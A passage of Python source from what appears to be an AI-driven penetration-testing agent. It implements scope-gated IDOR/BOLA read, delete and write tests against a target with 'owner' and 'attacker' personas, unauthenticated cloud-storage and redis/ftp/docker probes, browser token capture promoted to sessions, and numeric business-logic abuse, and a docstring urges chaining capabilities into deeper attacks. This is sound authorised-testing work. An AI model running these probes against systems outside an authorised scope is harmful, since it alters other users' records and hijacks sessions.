                                "impact": "Read other users' data by changing the object id; bulk exfiltration by walking ids.",
                                "evidence": ("anon %s -> %s (denied); '%s' and '%s' -> 200 identical (similarity %.3f); "
                                             "ownership proof: object carries owner identity '%s'"
                                             % (req, sn, owner, attacker, sim, marker)),
                                "remediation": "Enforce object-level authorization: verify the session owns the id server-side."})
                            try:
                                self.state.add_capability(self._Capability.FOREIGN_OBJECT_READ,
                                                          "cross-user read of %s" % target)
                            except Exception:
                                pass
                        elif object_specific:
                            # STRONG signal but NOT proof of ownership: an object-specific endpoint that
                            # two users read identically could still be a shared-but-protected resource
                            # (e.g. a paginated team feed). Emit a strong LEAD, not a confirmed finding
                            # (CHAD re-audit #3 — id+1 differing does not prove ownership).
                            findings.append({
                                "title": "Possible IDOR / BOLA — object-specific cross-user read (ownership unproven)",
                                "severity": "medium", "family": "idor", "confidence": "lead",
                                "cwe": "CWE-639", "target": target,
                                "tags": ["idor", "bola", "access-control", "horizontal", "needs-ownership-proof"],
                                "description": ("Two DIFFERENT authenticated users read the SAME protected object, and a "
                                                "different id returns different data (object-specific). Strong IDOR signal, "
                                                "but NOT proof of ownership — a shared-but-protected resource could look "
                                                "identical. CONFIRM by creating the object as '%s' and re-reading it as '%s'."
                                                % (owner, attacker)),
                                "impact": "If the object is user-owned, any user can read others' records by id.",
                                "evidence": ("anon %s -> %s (denied); '%s' and '%s' -> 200 identical (similarity %.3f); %s "
                                             "— object-specific but OWNERSHIP UNPROVEN" % (req, sn, owner, attacker, sim, ctrl_note))})
                        else:
                            findings.append({
                                "title": "Possible IDOR / BOLA — cross-user read (ownership unproven)",
                                "severity": "medium", "family": "idor", "confidence": "lead",
                                "cwe": "CWE-639", "target": target,
                                "tags": ["idor", "bola", "access-control", "horizontal", "needs-ownership-proof"],
                                "description": ("Two DIFFERENT authenticated users read the SAME protected object "
                                                "(anonymous denied). This is an IDOR SIGNAL, not proof — the object "
                                                "may be a legitimately SHARED resource. CONFIRM by proving one user "
                                                "uniquely owns it (create the object as '%s' and re-read as '%s', or "
                                                "match the owner's identity in the body)." % (owner, attacker)),
                                "impact": "If the object is user-owned, any user can read others' records by id.",
                                "evidence": ("anon %s -> %s (denied); '%s' and '%s' both read identical bytes "
                                             "(similarity %.3f); owner identity not present in the object, so "
                                             "ownership is UNPROVEN." % (req, sn, owner, attacker, sim))})

        seen, uniq = set(), []
        for f in findings:
            k = (f["title"], f.get("target"))
            if k not in seen:
                seen.add(k)
                uniq.append(f)
        auth_requests = {"attempted": tc["attempted"], "succeeded": tc["succeeded"],
                         "with_auth_material": tc["with_auth_material"],
                         "by_role": tc["by_role"], "status_dist": tc["status_dist"],
                         "endpoints_touched": len(tc["_endpoints"])}
        summary = {"ran": True, "roles": [r["role"] for r in roles], "operations": len(operations),
                   "gaps": len(result.get("gaps", [])), "confirmed": len(uniq),
                   "auth_requests": auth_requests}
        return ToolResult("authz_matrix", base, True, json.dumps(summary), uniq)

    # Built-in owned-object CREATE specs for known REST apps. Each: a create endpoint (body carries a
    # {marker}) + how to read/delete the returned id. Juice Shop's address book + card store are
    # per-user owned, so a cross-persona hit on a freshly-created one is a real BOLA.
    _CREATE_IDOR_SPECS = {
        "juiceshop": [
            {"create": {"method": "POST", "path": "/api/Addresss",
                        "body": '{"fullName":"apolaki","mobileNr":"1234567","zipCode":"12345",'
                                '"streetAddress":"{marker}","city":"T","state":"T","country":"T"}'},
             "read": "/api/Addresss/{id}", "delete": "/api/Addresss/{id}"},
            {"create": {"method": "POST", "path": "/api/Cards",
                        "body": '{"fullName":"apolaki {marker}","cardNum":"4111111111111111",'
                                '"expMonth":1,"expYear":2099}'},
             "read": "/api/Cards/{id}", "delete": "/api/Cards/{id}"},
        ],
    }

    async def _confirm_create_object_idor(self, inp: dict) -> ToolResult:
        """ACTIVE: CREATE-OBJECT IDOR (CHAD C). Create a uniquely-owned object as the OWNER persona,
        then try to READ (and, in Full mode only, DELETE) it as the ATTACKER persona. Because WE
        created the object with a private marker, ownership is DEFINITIVE — a cross-persona hit is a
        CONFIRMED access-control break (no similarity guessing). Bounded, scope-gated, and cleans up
        the object it created. Roles are referenced by name; the session token is resolved server-side."""
        import create_object_idor as _co
        base = (inp.get("base_url") or "").strip().rstrip("/")
        owner, attacker = inp.get("owner"), inp.get("attacker")
        specs = inp.get("specs") or self._CREATE_IDOR_SPECS.get(inp.get("app", ""), [])
        owner_h = dict(self._sessions.get(owner, {}))
        atk_h = dict(self._sessions.get(attacker, {}))
        if not base or not owner_h or not atk_h or not specs:
            return ToolResult("create_object_idor", base, True,
                              json.dumps({"ran": False, "note": "need base, two sessions, and specs"}), [])
        # write/delete of another user's object is state-changing — enabled only when the caller
        # explicitly opts in (the agent passes allow_write=True only in Full mode). Read is always safe.
        allow_write = bool(inp.get("allow_write"))
        findings, attempts = [], 0
        for spec in specs[:6]:
            cs = spec["create"]
            url = base + cs["path"]
            if not self.scope.validate(url)[0]:
                continue
            marker = _co.new_marker()
            body = cs["body"].replace("{marker}", marker)
            try:
                cr, _ = await self._http_send(cs["method"], url,
                                              {**owner_h, "Content-Type": "application/json"}, body, True)
            except Exception:
                continue
            attempts += 1
            oid = _co.extract_id(cr.status_code, cr.text, (dict(cr.headers or {})).get("Location", ""))
            read_s, read_b, del_s = None, "", None
            if oid and spec.get("read"):
                rurl = base + spec["read"].replace("{id}", oid)
                if self.scope.validate(rurl)[0]:
                    try:
                        rr, _ = await self._http_send("GET", rurl, atk_h, None, True)
                        read_s, read_b = rr.status_code, (rr.text or "")[:8000]
                    except Exception:
                        pass
            if allow_write and oid and spec.get("delete"):
                durl = base + spec["delete"].replace("{id}", oid)
                if self.scope.validate(durl)[0]:
                    try:
                        dr, _ = await self._http_send("DELETE", durl, atk_h, None, True)
                        del_s = dr.status_code
                    except Exception:
                        pass
            v = _co.verdict(marker=marker, create_status=cr.status_code, create_body=cr.text or "",
                            object_id=oid, read_status=read_s, read_body=read_b, delete_status=del_s)
            tgt = base + (spec.get("read") or cs["path"]).replace("{id}", oid or "")
            f = _co.to_finding(v, target=tgt, owner_role=owner, attacker_role=attacker)
            if f:
                findings.append(f)
            # cleanup: the OWNER removes the object we created (best-effort; harmless if already gone)
            if oid and spec.get("delete"):
                try:
                    await self._http_send("DELETE", base + spec["delete"].replace("{id}", oid), owner_h, None, True)
                except Exception:
                    pass
        return ToolResult("create_object_idor", base, True,
                          json.dumps({"ran": True, "attempts": attempts, "confirmed": len(findings)}), findings)

    async def _confirm_authz_write(self, inp: dict) -> ToolResult:
        """ACTIVE, INTRUSIVE (opt-in): horizontal WRITE authorization test with RESTORE. Reads the
        owner's object state, has a DIFFERENT user attempt a bounded change, re-reads as the owner:
        if the change persisted, cross-user WRITE is confirmed (CWE-639, critical). The original
        value is restored immediately — this stops at the last reversible proof boundary and never
        finalizes an irreversible business action. Requires owner + attacker sessions and a target;
        never fires unless explicitly invoked. Roles referenced by name (secrets resolved server-side)."""
        import difflib
        target = (inp.get("target_url") or "").strip()
        if not target or not self.scope.validate(target)[0]:
            return ToolResult("authz_write", target, False, "", [], "SCOPE BLOCK or missing target_url")
        owner_h = self._role_headers(inp, "owner")
        attacker_h = self._role_headers(inp, "attacker")
        if not (owner_h and attacker_h):
            return ToolResult("authz_write", target, True,
                              json.dumps({"confirmed": False, "note": "need owner + attacker sessions"}), [])
        try:
            ro, _ = await self._http_send("GET", target, owner_h, None, True)
        except Exception as e:
            return ToolResult("authz_write", target, False, "", [], f"read failed: {e}")
        if ro.status_code != 200 or len(ro.text) < 2:
            return ToolResult("authz_write", target, True,
                              json.dumps({"confirmed": False, "note": "owner cannot read the object"}), [])
        orig = ro.text
        try:
            obj = json.loads(orig)
        except Exception:
            obj = None
        marker = "apolaki_authz_probe"
        field, value = inp.get("field"), inp.get("value")
        if field is None and isinstance(obj, dict):
            field = next((k for k, v in obj.items() if isinstance(v, str)
                          and k.lower() not in ("id", "_id", "email", "password", "createdat", "updatedat")), None)
            value = marker
        elif field is not None and value is None:
            value = marker
        if field is None:
            return ToolResult("authz_write", target, True,
                              json.dumps({"confirmed": False, "note": "no mutable field found; supply field/value"}), [])
        body = {field: value}
        # attacker attempts the bounded write (PATCH, then PUT)
        wrote = None
        for method in ("PATCH", "PUT"):
            try:
                rw, _ = await self._http_send(method, target, {**attacker_h, "Content-Type": "application/json"}, body, True)
            except Exception:
                continue
            if rw.status_code < 400:
                wrote = method
                break
        # re-read as owner; did the attacker's change land on the owner's object?
        after, changed = "", False
        try:
            ra, _ = await self._http_send("GET", target, owner_h, None, True)
            after = ra.text
            changed = (str(value) in after and str(value) not in orig)
        except Exception:
            pass
        # RESTORE the original value (best-effort) — never leave the object mutated
        restored = False
        if changed and isinstance(obj, dict):
            for method in (wrote or "PATCH", "PUT"):
                try:
                    rr, _ = await self._http_send(method, target, {**owner_h, "Content-Type": "application/json"},
                                                  {field: obj.get(field)}, True)
                except Exception:
                    continue
                if rr.status_code < 400:
                    restored = True
                    break
        findings = []
        if changed:
            findings.append({
                "title": "IDOR / BOLA — cross-user object WRITE confirmed", "severity": "critical",
                "family": "idor", "confidence": "confirmed", "cwe": "CWE-639", "target": target,
                "tags": ["idor", "bola", "access-control", "horizontal", "write"],
                "description": ("A DIFFERENT authenticated user modified an object owned by another user. The write "
                                "was verified by re-reading the object as the owner and observing the injected value; "
                                "the original value was then restored."),
                "impact": "Tamper with, corrupt, or take over other users' records (orders, profiles, balances).",
                "evidence": ("owner GET %s -> 200; attacker %s field '%s'='%s' -> re-read as owner shows the change "
                             "(restored=%s)." % (target, wrote, field, value, restored)),
                "remediation": "Enforce object-level authorization on write paths: verify the session owns the id."})
            try:
                self.state.add_capability(self._Capability.FOREIGN_OBJECT_WRITE, "cross-user write of %s" % target)
            except Exception:
                pass
        return ToolResult("authz_write", target, True,
                          json.dumps({"confirmed": bool(changed), "write_method": wrote, "restored": restored}),
                          findings)

    async def _run_cloud_probe(self, inp: dict) -> ToolResult:
        """ACTIVE (cloud): probe a discovered object-storage bucket for PUBLIC listing (S3 / Azure Blob
        / GCS). Scope-gated, read-only GET, no credentials. A public listing is a confirmed exposure
        finding + a live-graph node. This turns cloud fingerprinting into real cloud technique execution."""
        import cloud_intel as _ci
        url = (inp.get("url") or "").strip()
        if not url or not self.scope.validate(url)[0]:
            return ToolResult("cloud_probe", url, False, "", [], "SCOPE BLOCK or missing url")
        try:
            r, _ = await self._http_send("GET", url, {}, None, True)
        except Exception as e:
            return ToolResult("cloud_probe", url, False, "", [], "fetch failed: %s" % e)
        exposed, ev = _ci.storage_exposure(r.status_code, r.text)
        findings = []
        if exposed:
            findings.append({
                "title": "Public cloud storage bucket — listable without authentication",
                "severity": "high", "family": "sensitive_exposure", "confidence": "confirmed",
                "cwe": "CWE-264", "target": url, "tags": ["cloud", "storage", "exposure", "no-auth"],
                "description": "A cloud object-storage bucket is publicly listable without authentication.",
                "evidence": "GET %s -> %s; %s" % (url, r.status_code, ev),
                "remediation": "Make the bucket private; block public ACLs and anonymous listing."})
            try:
                self.graph.observe("object", url, label="cloud-storage", source="cloud_probe",
                                   tested=True, enables=["arbitrary_file_read"])
            except Exception:
                pass
        return ToolResult("cloud_probe", url, True, json.dumps({"exposed": exposed}), findings)

    async def _run_service_pack(self, inp: dict) -> ToolResult:
        """ACTIVE (beyond web): actually RUN a discovered non-web service's technique pack and apply its
        deterministic oracle — HTTP-exposed control planes (docker/kubelet/elasticsearch) over the
        scoped+captured transport, raw services (redis/ftp) via a bounded socket probe. A confirmed
        exposure becomes a finding + a live-graph node. No credential brute-force. This is the wiring
        that turns service_router's plans into real execution."""
        import service_router as _sr
        host = (inp.get("host") or "").strip()
        port = inp.get("port")
        service = inp.get("service") or _sr.fingerprint(port, inp.get("banner", ""))
        pack = _sr.pack_for(service)
        if not host or not port or not pack:
            return ToolResult("service_pack", host, True,
                              json.dumps({"ran": False, "service": service, "note": "no pack / missing host:port"}), [])
        findings = []
        chk = pack["checks"][0]
        _HTTP_PROBE = {"docker": "/version", "kubelet": "/pods", "elasticsearch": "/_cat/indices"}
        if service in _HTTP_PROBE:
            url = "http://%s:%s%s" % (host, port, _HTTP_PROBE[service])
            if self.scope.validate(url)[0]:
                try:
                    r, _ = await self._http_send("GET", url, {}, None, True)
                    if r.status_code == 200 and len(r.text) > 2:
                        findings.append(self._service_finding(service, chk, url,
                                        "GET %s -> 200 (%db) with no authentication; oracle: %s"
                                        % (url, len(r.text), chk["oracle"]),
                                        critical=service in ("docker", "kubelet")))
                except Exception:
                    pass
        elif service in ("redis", "ftp"):
            probe = await self._socket_service_probe(service, host, int(port))
            if probe.get("confirmed"):
                findings.append(self._service_finding(service, chk, "%s:%s" % (host, port),
                                probe.get("evidence", ""), critical=False))
        # record into the LIVE graph (service node + any confirmed finding)
        try:
            svc_id = self.graph.observe("service", "%s:%s" % (host, port), label=service,
                                        source="service_pack", scope_asset=host)
            self.graph.mark_tested(svc_id, ok=bool(findings))
            for f in findings:
                fid = self.graph.observe("finding", f["title"] + "@" + f["target"], label=f["title"],
                                         source="service_pack", confidence=1.0, tested=True)
                self.graph.link(svc_id, fid, "found_on", source="service_pack")
        except Exception:
            pass
        return ToolResult("service_pack", host, True,
                          json.dumps({"ran": True, "service": service, "confirmed": len(findings)}), findings)

    def _service_finding(self, service: str, chk: dict, target: str, evidence: str, critical: bool) -> dict:
        return {"title": "%s service exposed without authentication" % service,
                "severity": "critical" if critical else "high", "family": "access_control",
                "confidence": "confirmed", "cwe": chk.get("cwe", "CWE-306"), "target": target,
                "tags": ["beyond-web", service, "no-auth", "access-control"],
                "description": "A %s service is reachable without authentication." % service,
                "evidence": evidence,
                "remediation": "Require authentication and restrict network exposure of this service."}

    async def _socket_service_probe(self, service: str, host: str, port: int) -> dict:
        """Bounded raw-socket exposure probe (no credential guessing). redis: unauth PING -> +PONG;
        ftp: USER anonymous -> 230. Best-effort — any failure is a clean negative."""
        try:
            reader, writer = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=4)
        except Exception:
            return {"confirmed": False}
        try:
            if service == "redis":
                writer.write(b"PING\r\n")
                await writer.drain()
                data = await asyncio.wait_for(reader.read(64), timeout=3)
                return {"confirmed": b"+PONG" in data,
                        "evidence": "redis PING -> %r with no AUTH (open data store)" % data[:32]}
            if service == "ftp":
                await asyncio.wait_for(reader.read(128), timeout=3)          # banner
                writer.write(b"USER anonymous\r\n")
                await writer.drain()
                resp = await asyncio.wait_for(reader.read(128), timeout=3)
                return {"confirmed": b"230" in resp,
                        "evidence": "FTP USER anonymous -> %r (anonymous access)" % resp[:48]}
        except Exception:
            return {"confirmed": False}
        finally:
            try:
                writer.close()
            except Exception:
                pass
        return {"confirmed": False}

    async def _browser_navigate(self, inp: dict) -> ToolResult:
        """ACTIVE: drive a real headless browser through a DECLARATIVE step list (goto / click /
        fill / press / wait — NEVER arbitrary JS from the model) and capture what a DevTools
        session would show: the final URL, the visible DOM text, localStorage/sessionStorage,
        the XHR/fetch API calls the page made, and the loaded scripts. This is how the agent
        drives authenticated single-page-app flows (log in via the UI, then act) and inspects
        client-side state. Every navigation is scope-validated; a step that lands off-scope
        stops the flow. Secret VALUES in web storage are redacted from what the model sees, but
        an exposed token is reported as a finding. Degrades gracefully if Chromium is absent."""
        steps = inp.get("steps") or []
        start = (inp.get("url") or "").strip()
        chrome = _chrome_path()
        if not chrome:
            return ToolResult("browser_navigate", start, False, "", [],
                              "headless browser unavailable (Chromium/Playwright not installed) — use http_read/http_request")
        if start and not self.scope.validate(start)[0]:
            return ToolResult("browser_navigate", start, False, "", [], "SCOPE BLOCK: off-scope URL")
        hdrs = self._resolve_headers(inp)
        api_calls, step_log, findings, xhr_auth = [], [], [], []
        try:
            from playwright.async_api import async_playwright
            os.environ.setdefault("PLAYWRIGHT_SKIP_BROWSER_DOWNLOAD", "1")
            async with async_playwright() as pw:
                browser = await pw.chromium.launch(headless=True, executable_path=chrome,
                                                   args=["--no-sandbox", "--disable-gpu", "--disable-dev-shm-usage"])
                ctx = await browser.new_context(ignore_https_errors=True)
                if hdrs:
                    try:
                        await ctx.set_extra_http_headers({k: str(v) for k, v in hdrs.items()})
                    except Exception:
                        pass
                page = await ctx.new_page()
                def _on_req(r):
                    if r.resource_type in ("xhr", "fetch"):
                        api_calls.append(r.method + " " + r.url)
                        try:
                            a = r.headers.get("authorization")
                            if a:
                                xhr_auth.append(a)          # the token the app REALLY sends
                        except Exception:
                            pass
                page.on("request", _on_req)

                async def _nav(u):
                    if not u or not self.scope.validate(u)[0]:
                        step_log.append({"goto": u, "error": "off-scope, skipped"})
                        return
                    await page.goto(u, wait_until="domcontentloaded", timeout=12000)
                    step_log.append({"goto": u})

                if start:
                    await _nav(start)
                for st in steps[:20]:
                    act = (st.get("action") or "").lower()
                    try:
                        if act == "goto":
                            await _nav(st.get("url", ""))
                        elif act == "click":
                            await page.click(st["selector"], timeout=5000); step_log.append({"click": st["selector"]})
                        elif act == "fill":
                            await page.fill(st["selector"], str(st.get("value", ""))); step_log.append({"fill": st["selector"]})
                        elif act == "press":
                            await page.press(st.get("selector", "body"), st.get("key", "Enter")); step_log.append({"press": st.get("key")})
                        elif act == "wait":
                            await page.wait_for_timeout(min(int(st.get("ms", 800)), 5000)); step_log.append({"wait": st.get("ms", 800)})
                        else:
                            step_log.append({"unknown_action": act})
                        cur = page.url
                        if cur and not self.scope.validate(cur)[0]:
                            step_log.append({"navigated_off_scope": cur, "action": "stopped"})
                            break
                    except Exception as e:
                        step_log.append({"action": act, "error": str(e)[:120]})
                final_url = page.url
                try:
                    dom = (await page.evaluate("document.body ? document.body.innerText : ''"))[:3000]
                except Exception:
                    dom = ""
                try:
                    storage = await page.evaluate(
                        "({local:Object.fromEntries(Object.entries(localStorage)),"
                        " session:Object.fromEntries(Object.entries(sessionStorage))})")
                except Exception:
                    storage = {"local": {}, "session": {}}
                try:
                    scripts = await page.evaluate("Array.from(document.scripts).map(s=>s.src).filter(Boolean).slice(0,50)")
                except Exception:
                    scripts = []
                try:
                    cookies = await ctx.cookies()
                except Exception:
                    cookies = []
                await browser.close()
        except Exception as e:
            return ToolResult("browser_navigate", start, False, "", [], f"browser error: {str(e)[:160]}")
        # redact secret VALUES from web storage (keep keys) and flag exposed tokens
        red, exposed = {}, []
        for realm, bag in (("local", storage.get("local", {})), ("session", storage.get("session", {}))):
            for k, v in (bag or {}).items():
                vv = str(v)
                is_jwt = vv[:3] == "eyJ" and vv.count(".") == 2
                is_secret = is_jwt or any(h in k.lower() for h in ("token", "auth", "secret", "key", "session", "jwt", "password"))
                red[f"{realm}.{k}"] = ("<redacted " + ("jwt" if is_jwt else "secret") + ">") if is_secret else vv[:120]
                if is_secret:
                    exposed.append(f"{realm}Storage.{k}" + (" (JWT)" if is_jwt else ""))
        if exposed:
            findings.append({"title": "Session token stored in browser web storage", "severity": "low",
                             "target": final_url, "family": "exposure", "confidence": "lead",
                             "cwe": "CWE-522", "tags": ["web-storage", "token", "xss-impact"],
                             "description": ("A session token/secret is held in localStorage/sessionStorage, which any "
                                             "JavaScript on the page can read — so an XSS becomes full session theft. An "
                                             "httpOnly cookie avoids this."),
                             "evidence": "exposed keys: " + ", ".join(exposed[:10])})
        in_scope_apis = sorted({a for a in api_calls if self.scope.validate(a.split(" ", 1)[-1])[0]})
        self._add_urls([a.split(" ", 1)[-1] for a in in_scope_apis])   # seed discovered APIs into the surface
        # promote-to-session: turn a browser login into a named HTTP session so the request
        # primitives inherit browser-acquired auth (JWT in storage → Bearer; else cookies).
        promoted = None
        if inp.get("promote_session"):
            role = inp["promote_session"]
            # prefer the Bearer token OBSERVED on real XHR/fetch (what the app actually sends), else a
            # structurally-valid JWT from web storage — not just the first eyJ-looking value (CHAD #4).
            store_vals = list((storage.get("local") or {}).values()) + list((storage.get("session") or {}).values())
            tok = _pick_session_token(store_vals, xhr_auth)
            if tok:
                self._sessions[role] = {"Authorization": "Bearer " + tok}
            elif cookies:
                ck = "; ".join(f"{c['name']}={c['value']}" for c in cookies if c.get('name'))
                if ck:
                    self._sessions[role] = {"Cookie": ck}
            if role in self._sessions:
                self.state.add_identity(role, {"auth_type": "bearer" if tok else "cookie",
                                               "identity": "browser:" + role, "is_admin": False})
                promoted = role
        out = {"final_url": final_url, "steps_run": step_log, "dom_excerpt": dom[:1500],
               "web_storage": red, "api_calls_discovered": in_scope_apis[:40], "scripts": scripts[:30],
               "promoted_session": promoted}
        return ToolResult("browser_navigate", final_url or start, True, json.dumps(out), findings)

    async def _test_numeric_abuse(self, inp: dict) -> ToolResult:
        """INTRUSIVE: business-logic boundary testing on a numeric field. Sends a benign
        control plus out-of-range values (negative / zero / huge / fractional) to a
        state-changing request and reports which the server ACCEPTS (2xx) that it should
        reject — the substrate for price/quantity/amount abuse. NEVER finalizes payment or
        performs an irreversible action; it only probes acceptance. Emits a lead (impact
        depends on the downstream invariant — verify with a state re-read via http_read)."""
        url = (inp.get("url") or "").strip()
        method = (inp.get("method") or "POST").upper()
        param = inp.get("param") or ""
        base_body = inp.get("body") if isinstance(inp.get("body"), dict) else {}
        if not url or not param:
            return ToolResult("numeric_abuse", url, False, "", [], "url and param required")
        if not self.scope.validate(url)[0]:
            return ToolResult("numeric_abuse", url, False, "", [], "SCOPE BLOCK: off-scope URL")
        headers = {**self._resolve_headers(inp), "Content-Type": "application/json"}
        control = inp.get("control", 1)
        values = inp.get("values") or [-1, 0, 999999, 1.5]

        def _set(body, path, val):
            b = json.loads(json.dumps(body)); node = b
            parts = path.split(".")
            for p in parts[:-1]:
                node = node.setdefault(p, {})
            node[parts[-1]] = val
            return b

        async def _send(val):
            try:
                r, _ = await self._http_send(method, url, headers, _set(base_body, param, val), True)
                return r.status_code, r.text[:400]
            except Exception:
                return 0, ""
        cs, _ = await _send(control)
        accepted = []
        for v in values[:6]:
            st, _ = await _send(v)
            if 200 <= st < 300:                       # server accepted an out-of-range value
                accepted.append(v)
        leads = []
        if accepted:
            leads.append({"title": f"Business-logic: out-of-range '{param}' accepted", "severity": "medium",
                          "target": url, "family": "business_logic", "confidence": "lead", "cwe": "CWE-840",
                          "tags": ["business-logic", "input-validation"],
                          "description": (f"The server accepted out-of-range values {accepted} for numeric field "
                                          f"'{param}' (control {control} → {cs}). If this feeds a total/price/limit it "
                                          "enables fraud (negative totals, free items). Verify the downstream effect."),
                          "evidence": f"accepted: {accepted}; control {control} -> HTTP {cs}"})
        return ToolResult("numeric_abuse", url, True,
                          json.dumps({"param": param, "control_status": cs, "accepted_out_of_range": accepted}), leads)

    async def _mission_state(self, inp: dict) -> ToolResult:
        """PASSIVE: return the current investigation state — acquired identities, confirmed
        CAPABILITIES (e.g. database_read, foreign_object_read, admin_session), objects seen,
        extracted variables, and chaining hints (what each capability unlocks next). Read it
        to plan the next move and to CHAIN confirmed capabilities into deeper attacks."""
        return ToolResult("mission_state", "", True, json.dumps(self.state.to_dict()), [])

    async def _mission_intel(self, inp: dict) -> ToolResult:
        """PASSIVE: return the Target Intelligence harvested from the target's own surface —
        candidates it leaked (emails, usernames, object-ids, routes, external URLs, decoded
        blobs, hints) that exploitation can consume as run-time FIXTURES. Derive a value from
        the target instead of guessing; secrets are redacted before the model sees them."""
        return ToolResult("mission_intel", "", True,
                          json.dumps(self.intel.to_dict(redact_secrets=True)), [])

    async def _run_workflow(self, inp: dict) -> ToolResult:
        """INTRUSIVE: execute a declarative investigation workflow (technique pack) — ordered
        steps calling the scoped primitives, with safe {var} substitution, response extraction
        into mission variables, a deterministic oracle assertion, and produced capabilities.
        No arbitrary code; only the typed step vocabulary. Confirmed findings still come from
        the confirm_* steps inside it (truth-first). Bounded, scope-guarded per step."""
        import workflow as _wf
        wf = inp.get("workflow") if isinstance(inp.get("workflow"), dict) else None
        if not wf and inp.get("pack"):                 # run a named reusable technique pack
            import packs
            p = packs.get(inp["pack"])
            if not p:
                return ToolResult("run_workflow", inp["pack"], False, "", [], f"unknown pack '{inp['pack']}'")
            wf = dict(p); wf["inputs"] = inp.get("inputs") or {}
        if not wf:
            wf = inp
        res = await _wf.run(self, wf)
        return ToolResult("run_workflow", str(wf.get("id", "")), True, json.dumps(res)[:4000], [])

    async def _list_workflows(self, inp: dict) -> ToolResult:
        """PASSIVE: list the built-in reusable technique packs and the inputs each needs.
        Run one with run_workflow{pack:"<id>", inputs:{...}} — general across targets."""
        import packs
        return ToolResult("list_workflows", "", True, json.dumps(packs.list_packs()), [])

    async def _benchmark_lab(self, inp: dict) -> ToolResult:
        """ACTIVE (lab-only, SEPARATE from detection): score coverage against a known lab's
        completion oracle (juiceshop / dvwa). Auto-detects the lab from the page if not
        given. For benchmark measurement — never hardcoded into scanners."""
        import labs
        base = (inp.get("base_url") or inp.get("url") or "").strip()
        if not base or not self.scope.validate(base)[0]:
            return ToolResult("benchmark_lab", base, False, "", [], "SCOPE BLOCK or missing base_url")
        lab = inp.get("lab")
        if not lab:
            try:
                import httpx
                async with httpx.AsyncClient(verify=False, timeout=10, headers={"User-Agent": _UA}) as c:
                    html = (await c.get(base)).text
                lab = labs.detect(html)
            except Exception:
                lab = None
        if not lab:
            return ToolResult("benchmark_lab", base, True,
                              json.dumps({"note": "no known lab detected", "available": labs.list_labs()}), [])
        return ToolResult("benchmark_lab", base, True, json.dumps(labs.benchmark(lab, base)), [])

    def _graph_add_url(self, u: str) -> None:
        """Grow the LIVE canonical graph as URLs are discovered: host -> endpoint (-> object) nodes
        with provenance. Best-effort; never raises. This is what makes the graph a live world model."""
        try:
            import authz_matrix as _am
            p = urlparse(u)
            host, path = p.netloc, (p.path or "/")
            eid = self.graph.observe("endpoint", (host + path) if host else path, label=path,
                                     source="live-recon")
            if host:
                hid = self.graph.observe("host", host, source="live-recon")
                self.graph.link(hid, eid, "serves", source="live-recon")
            if _am.is_object_path(path):
                oid = self.graph.observe("object", (host + path) if host else path, label=path,
                                         source="live-recon", enables=["foreign_object_read"])
                self.graph.link(eid, oid, "exposes", source="live-recon")
        except Exception:
            pass

    def _add_urls(self, urls) -> None:
        for u in urls:
            if not u or u in self.urls:
                continue
            # never let a session-destroying endpoint into the surface (self-logout)
            p = urlparse(u)
            if _SESSION_KILL_RE.search((p.path or "") + ("?" + p.query if p.query else "")):
                continue
            if _RECURSIVE_LEAK_RE.search(p.path or ""):        # recursive _debug/_debug junk
                continue
            if surface_mod.clean_url(u) and self.scope.validate(u)[0]:
                self.urls.append(u)
                self._graph_add_url(u)     # grow the live world model as the surface is discovered

    async def _http(self, url: str, method: str = "GET", headers: dict = None,
                    body: str = None, capture: bool = True, finding_id: str = None):
        """Send one request via httpx; optionally capture a redacted exchange."""
        import httpx
        req_headers = {"User-Agent": _UA, **(self.session_headers or {}), **(headers or {})}
        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=15) as c:
                r = await c.request(method.upper(), url, headers=req_headers,
                                    content=(body.encode() if body else None))
                try:
                    text = r.text
                except Exception:
                    text = ""
                resp = {"status": r.status_code, "headers": dict(r.headers), "body": text,
                        "length": len(r.content), "final_url": str(r.url)}
                self._harvest_body(resp["final_url"] or url, resp["headers"], text)
                try:
                    self.capture.add(method, url, resp["status"], req_headers=req_headers,
                                     resp_headers=resp["headers"], resp_len=resp["length"], engine="http",
                                     resp_ct=resp["headers"].get("content-type", ""))
                except Exception:
                    pass
        except Exception as e:
            return {"error": str(e), "status": 0, "headers": {}, "body": "", "length": 0, "final_url": url}

        if capture and self.mission_id:
            db.add_exchange(self.mission_id, {
                "url": url, "method": method.upper(), "request_headers": req_headers,
                "request_body": body, "status_code": resp["status"],
                "response_headers": resp["headers"], "response_body": text[:4000]},
                finding_id=finding_id)
        return resp

    def _attach_poc(self, f: dict, req_url: str, resp=None, method: str = "GET",
                    body: str = None, timing: str = None) -> dict:
        """Attach the EXACT confirming request/response to a finding so its PoC shows the
        real injecting request, not a reconstruction. The native probes use private HTTP
        clients (for raw-request control), so without this their proving exchange is lost.
        `resp` may be an httpx.Response, a dict (status/body), or None. Rendered by the
        report's raw-proof blocks (request/response/timing) + the /poc export."""
        req = f"{method.upper()} {req_url}"
        if body:
            req += f"\n\n{body}"
        f["request"] = req
        curl = "curl -i -sk " + ("-X " + method.upper() + " " if method.upper() != "GET" else "") + f"'{req_url}'"
        if body:
            curl += f" --data '{body}'"
        if self.session_headers:
            curl += "   # add your authorized session (Cookie/Authorization) to reproduce"
        f["curl"] = curl
        if resp is not None:
            status = getattr(resp, "status_code", None)
            text = getattr(resp, "text", None)
            if status is None and isinstance(resp, dict):
                status, text = resp.get("status"), resp.get("body")
            if status is not None:
                f["response"] = f"HTTP {status}\n" + str(text or "")[:1500]
        if timing:
            f["timing"] = timing
        return f

    def _ni(self, std: int, deep: int, insane: int) -> int:
        """Intensity-scaled cap: the native probes widen their parameter/payload breadth
        as intensity rises (standard keeps today's fast bounds; deep/insane dig wider)."""
        return {"standard": std, "deep": deep, "insane": insane}.get(
            getattr(self, "intensity", "standard"), std)

    # ── PASSIVE ──────────────────────────────────────────────────
    async def _run_subfinder(self, inp: dict) -> ToolResult:
        domain = inp["domain"]
        # deep/insane: query ALL sources (-all) for a wider subdomain surface (slower).
        allsrc = ["-all"] if getattr(self, "intensity", "standard") in ("deep", "insane") else []
        out, err = await self._cmd(["subfinder", "-d", domain, "-silent", "-json"] + allsrc,
                                   timeout=240 if allsrc else 120)
        if err.startswith("__MISSING__"):
            return ToolResult("subfinder", domain, False, "", [], "subfinder not installed")
        subs = []
        for line in out.strip().split("\n"):
            if not line.strip():
                continue
            try:
                sub = json.loads(line).get("host", "")
            except Exception:
                sub = line.strip()
            if sub and self.scope.validate(sub)[0]:
                subs.append({"subdomain": sub})
        self.recon["subdomains"].extend(s["subdomain"] for s in subs)
